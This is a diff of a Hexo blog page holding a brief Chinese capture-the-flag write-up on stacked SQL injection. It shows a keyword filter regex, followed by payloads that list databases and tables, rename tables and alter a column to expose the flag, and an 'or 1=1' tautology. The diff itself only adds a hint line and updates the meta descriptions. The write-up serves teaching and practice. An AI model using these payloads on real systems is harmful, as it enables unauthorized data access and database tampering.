@@ -9,15 +9,15 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);过滤了括号内的东西?a&#x3D;1#返回正常堆叠查询 id&#x3D;1’;show databases;’爆出数据库内容id&#x3D;1’;show tables;’爆出所有表名 因为alert,rename没有被过滤，可以改变表名 &#x2F;?inject&#x3D;1’;RENAME TAB">
+  <meta name="description" content="return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);过滤了括号内的东西?a&#x3D;1#返回正常 考虑用堆叠注入 堆叠查询 id&#x3D;1’;show databases;’爆出数据库内容id&#x3D;1’;show tables;’爆出所有表名 因为alert,rename没有被过滤，可以改变表名 &#x2F;?inject&#x3D;1’;R">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql1">
 <meta property="og:url" content="http://yoursite.com/2020/01/12/sql1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);过滤了括号内的东西?a&#x3D;1#返回正常堆叠查询 id&#x3D;1’;show databases;’爆出数据库内容id&#x3D;1’;show tables;’爆出所有表名 因为alert,rename没有被过滤，可以改变表名 &#x2F;?inject&#x3D;1’;RENAME TAB">
+<meta property="og:description" content="return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);过滤了括号内的东西?a&#x3D;1#返回正常 考虑用堆叠注入 堆叠查询 id&#x3D;1’;show databases;’爆出数据库内容id&#x3D;1’;show tables;’爆出所有表名 因为alert,rename没有被过滤，可以改变表名 &#x2F;?inject&#x3D;1’;R">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-01-12T13:54:26.000Z">
-<meta property="article:modified_time" content="2020-01-12T13:56:02.790Z">
+<meta property="article:modified_time" content="2020-01-12T13:57:13.111Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="堆叠注入">
 <meta name="twitter:card" content="summary">
@@ -211,7 +211,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常<br>堆叠查询 id=1’;show databases;’爆出数据库内容<br>id=1’;show tables;’爆出所有表名</p>
+        <p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常</p>
+<p>考虑用堆叠注入</p>
+<p>堆叠查询 id=1’;show databases;’爆出数据库内容<br>id=1’;show tables;’爆出所有表名</p>
 <p>因为alert,rename没有被过滤，可以改变表名</p>
 <p>/?inject=1’;RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</p>
 <p>最后直接通过i’or’1’=’1可以爆出flag</p>
